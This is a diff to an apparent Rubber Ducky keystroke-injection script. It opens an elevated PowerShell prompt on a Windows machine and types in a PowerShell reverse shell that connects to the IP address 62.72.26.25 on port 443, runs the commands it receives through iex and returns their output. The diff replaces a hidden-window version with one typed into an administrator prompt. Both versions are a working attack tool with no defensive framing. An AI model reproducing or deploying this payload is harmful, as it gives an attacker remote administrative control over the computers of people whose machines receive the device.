@@ -1,6 +1,9 @@
 DELAY 2000
 GUI r
 DELAY 500
-REM Open PowerShell in a hidden window as administrator
-STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden','-NoProfile','-ExecutionPolicy Bypass','-Command $client = New-Object System.Net.Sockets.TCPClient('62.72.26.25',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' -Verb runAs"
+REM Open PowerShell as administrator
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
+DELAY 500
+REM Download the PowerShell script
+STRING $client = New-Object System.Net.Sockets.TCPClient('62.72.26.25',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();exit;
